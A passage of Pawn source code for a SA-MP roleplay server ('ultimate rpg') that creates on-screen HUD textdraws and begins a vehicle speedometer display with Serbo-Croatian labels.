		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][11], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][11], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][11], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][11], 0);

		Ingame_pTD[playerid][12] = CreatePlayerTextDraw(playerid, 532.310791, 6.813313, "i");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][12], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][12], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][12], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][12], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][12], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][12], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][12], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][12], 0);

		Ingame_pTD[playerid][13] = CreatePlayerTextDraw(playerid, 542.977783, 6.813313, "m");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][13], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][13], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][13], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][13], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][13], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][13], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][13], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][13], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][13], 0);

		Ingame_pTD[playerid][14] = CreatePlayerTextDraw(playerid, 551.766784, 6.813313, "a");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][14], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][14], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][14], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][14], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][14], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][14], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][14], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][14], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][14], 0);

		Ingame_pTD[playerid][15] = CreatePlayerTextDraw(playerid, 559.966979, 6.813313, "t");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][15], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][15], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][15], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][15], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][15], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][15], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][15], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][15], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][15], 0);

		Ingame_pTD[playerid][16] = CreatePlayerTextDraw(playerid, 569.700317, 6.813313, "e");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][16], 0.179222, 0.862308);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][16], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][16], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][16], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][16], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][16], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][16], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][16], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][16], 0);

		Ingame_pTD[playerid][17] = CreatePlayerTextDraw(playerid, 499.633453, 16.128927, "www.ultimate-rpg.com");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][17], 0.096555, 0.524311);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][17], 1);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][17], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][17], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][17], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][17], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][17], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][17], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][17], 0);

		Ingame_pTD[playerid][18] = CreatePlayerTextDraw(playerid, 492.288635, 396.815551, "");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][18], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][18], 105.000000, 106.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][18], 1);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][18], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][18], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][18], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][18], 0);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][18], 5);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][18], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][18], 0);
		PlayerTextDrawSetPreviewModel(playerid, Ingame_pTD[playerid][18], GetPlayerSkin(playerid));
		PlayerTextDrawSetPreviewRot(playerid, Ingame_pTD[playerid][18], 0.000000, 0.000000, -30.000000, 1.000000);

		new str[38];
		format(str, 38, "%s ~y~(id: %d)", ImeIgraca(playerid), playerid);
		Ingame_pTD[playerid][19] = CreatePlayerTextDraw(playerid, 523.333190, 432.602081, str);
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][19], 0.118220, 0.584088);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][19], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][19], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][19], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][19], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][19], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][19], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][19], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][19], 0);

		Ingame_pTD[playerid][20] = CreatePlayerTextDraw(playerid, 566.244262, 432.068969, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][20], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][20], 3.839998, 4.039999);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][20], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][20]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][20], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][20], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][20], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][20], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][20], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][20], 0);

		Ingame_pTD[playerid][21] = CreatePlayerTextDraw(playerid, 566.244262, 436.069213, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][21], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][21], 3.839998, 4.039999);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][21], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][21]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][21], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][21], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][21], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][21], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][21], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][21], 0);

		Ingame_pTD[playerid][22] = CreatePlayerTextDraw(playerid, 566.244262, 439.969451, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][22], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][22], 3.839998, 4.039999);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][22], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][22]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][22], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][22], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][22], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][22], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][22], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][22], 0);

		Ingame_pTD[playerid][23] = CreatePlayerTextDraw(playerid, 72.266670, 436.555847, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][23], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][23], 1.000000, 6.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][23], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][23]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][23], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][23], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][23], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][23], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][23], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][23], 0);

		Ingame_pTD[playerid][24] = CreatePlayerTextDraw(playerid, 79.711051, 432.355590, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][24], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][24], 1.000000, 11.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][24], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][24]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][24], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][24], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][24], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][24], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][24], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][24], 0);

		Ingame_pTD[playerid][25] = CreatePlayerTextDraw(playerid, 72.155509, 442.413421, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][25], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][25], 8.499983, 1.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][25], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][25]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][25], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][25], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][25], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][25], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][25], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][25], 0);

		Ingame_pTD[playerid][26] = CreatePlayerTextDraw(playerid, 77.866584, 433.857940, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][26], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][26], 0.819998, 7.279960);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][26], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][26]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][26], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][26], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][26], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][26], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][26], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][26], 0);

		Ingame_pTD[playerid][27] = CreatePlayerTextDraw(playerid, 73.966644, 435.758056, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][27], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][27], 1.000000, 5.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][27], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][27]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][27], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][27], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][27], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][27], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][27], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][27], 0);

		Ingame_pTD[playerid][28] = CreatePlayerTextDraw(playerid, 73.933280, 440.424591, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][28], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][28], 5.000000, 1.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][28], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][28]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][28], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][28], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][28], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][28], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][28], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][28], 0);

		Ingame_pTD[playerid][29] = CreatePlayerTextDraw(playerid, 121.244331, 434.024566, "ultimate rpg");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][29], 0.122887, 0.574000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][29], 3);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][29], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][29], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][29], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][29], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][29], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][29], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][29], 0);

		Ingame_pTD[playerid][30] = CreatePlayerTextDraw(playerid, 85.544395, 438.302246, "www.ultimate-rpg.com");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][30], 0.096886, 0.523998);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][30], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][30]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][30], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][30], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][30], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][30], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][30], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][30], 0);

		Ingame_pTD[playerid][31] = CreatePlayerTextDraw(playerid, 69.933349, 429.859710, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][31], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][31], 100.000000, -1.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][31], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][31]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][31], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][31], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][31], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][31], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][31], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][31], 0);

		Ingame_pTD[playerid][32] = CreatePlayerTextDraw(playerid, 170.488906, 425.946594, "....");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][32], 0.153108, 0.484977);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][32], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][32]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][32], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][32], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][32], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][32], 1);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][32], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][32], 0);

		Ingame_pTD[playerid][33] = CreatePlayerTextDraw(playerid, 150.377746, 442.399566, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][33], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][33], 23.380008, -1.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][33], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][33]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][33], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][33], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][33], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][33], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][33], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][33], 0);

		Ingame_pTD[playerid][34] = CreatePlayerTextDraw(playerid, 174.488891, 438.588806, "....");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][34], 0.153108, 0.484977);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][34], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][34]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][34], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][34], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][34], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][34], 1);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][34], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][34], 0);

		Ingame_pTD[playerid][35] = CreatePlayerTextDraw(playerid, 150.644454, 435.281829, "u-poruke: ~w~random_poruke");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][35], 0.120777, 0.574576);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][35], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][35]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][35], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][35], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][35], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][35], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][35], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][35], 0);

		Ingame_pTD[playerid][36] = CreatePlayerTextDraw(playerid, 501.600097, 427.519744, "u-igrac:");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][36], 0.120777, 0.574576);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][36], 1);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][36], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][36], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][36], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][36], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][36], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][36], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][36], 0);

		format(str, 15, "$%d", PlayerInfo[playerid][xBRacun]);
		Ingame_pTD[playerid][37] = CreatePlayerTextDraw(playerid, 607.491271, 96.711807, str);
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][37], 0.369666, 1.529481);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][37], 3);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][37]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][37], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][37], 1);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][37], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][37], 3);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][37], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][37], 0);

		Ingame_pTD[playerid][38] = CreatePlayerTextDraw(playerid, 467.266906, 429.859710, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][38], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Ingame_pTD[playerid][38], 33.000000, -1.000000);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][38], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][38]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][38], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][38], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][38], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][38], 4);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][38], 0);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][38], 0);

		Ingame_pTD[playerid][39] = CreatePlayerTextDraw(playerid, 459.533355, 426.144348, "....");
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][39], 0.153108, 0.484977);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][39], 1);
		CheckTextDrawColor(playerid, Ingame_pTD[playerid][39]);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][39], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][39], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][39], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][39], 1);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][39], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][39], 0);

		Ingame_pTD[playerid][40] = CreatePlayerTextDraw(playerid, 480.333312, 415.815032, "_"); //newyear
		PlayerTextDrawLetterSize(playerid, Ingame_pTD[playerid][40], 0.081666, 0.583703);
		PlayerTextDrawAlignment(playerid, Ingame_pTD[playerid][40], 2);
		PlayerTextDrawColor(playerid, Ingame_pTD[playerid][40], -1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][40], 0);
		PlayerTextDrawSetOutline(playerid, Ingame_pTD[playerid][40], 0);
		PlayerTextDrawBackgroundColor(playerid, Ingame_pTD[playerid][40], 255);
		PlayerTextDrawFont(playerid, Ingame_pTD[playerid][40], 2);
		PlayerTextDrawSetProportional(playerid, Ingame_pTD[playerid][40], 1);
		PlayerTextDrawSetShadow(playerid, Ingame_pTD[playerid][40], 0);

		for(new i = 0; i < 41; i++) PlayerTextDrawShow( playerid, Ingame_pTD[ playerid ][ i ] );
	}
	else 
	{
	    for( new b; b < 5; b++) TextDrawHideForPlayer( playerid, Ingame_gTD[ b ] );
	    for( new i; i < 41; i++) 
	    {
			PlayerTextDrawHide( playerid, Ingame_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Ingame_pTD[ playerid ][ i ] );
			Ingame_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}

_:public BuildSpeedoTextDraws(playerid, bool:show)
{
	if(show == true)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
		    for( new i = 0; i < 9; i ++)
			{
				PlayerTextDrawHide( playerid, Speedo_pTD[ playerid ][ i ] );
				PlayerTextDrawDestroy( playerid, Speedo_pTD[ playerid ][ i ] );
				Speedo_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
			}

			Speedo_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 147.766662, 389.695281, "box");
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][0], 0.000000, 3.186670);
			PlayerTextDrawTextSize(playerid, Speedo_pTD[playerid][0], 264.160156, 0.000000);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][0], 1);
			PlayerTextDrawColor(playerid, Speedo_pTD[playerid][0], -1);
			PlayerTextDrawUseBox(playerid, Speedo_pTD[playerid][0], 1);
			PlayerTextDrawBoxColor(playerid, Speedo_pTD[playerid][0], 105);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][0], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][0], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][0], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][0], 1);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][0], 1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][0], 0);

			new str[100], Float:hp, engine, lights, alarm, doors, bonnet, boot, objective;
        	GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
			GetVehicleHealth(GetPlayerVehicleID(playerid), hp);

			format(str, sizeof(str), "%s (id: ~y~%d~w~)~n~~w~ostecenje:_~y~%.1f~n~~w~vrata: ~y~%s", 
																									GetVehicleNameEx(GetVehicleModel(GetPlayerVehicleID(playerid))),
																									GetPlayerVehicleID(playerid),
																									hp,
																									(doors == 1 ? "Zakljucana" : "Otkljucana"));

			Speedo_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 148.211120, 389.808898, str);
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][1], 0.122552, 0.642430);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][1], 1);
			PlayerTextDrawColor(playerid, Speedo_pTD[playerid][1], -1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][1], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][1], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][1], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][1], 2);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][1], 1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][1], 0);

			Speedo_pTD[playerid][2] = CreatePlayerTextDraw(playerid, 149.111099, 406.630981, "...........................");
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][2], 0.351999, 1.350000);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][2], 1);
			PlayerTextDrawColor(playerid, Speedo_pTD[playerid][2], -1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][2], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][2], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][2], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][2], 1);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][2], 1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][2], 0);

			Speedo_pTD[playerid][3] = CreatePlayerTextDraw(playerid, 145.933258, 387.146209, "LD_SPAC:white");
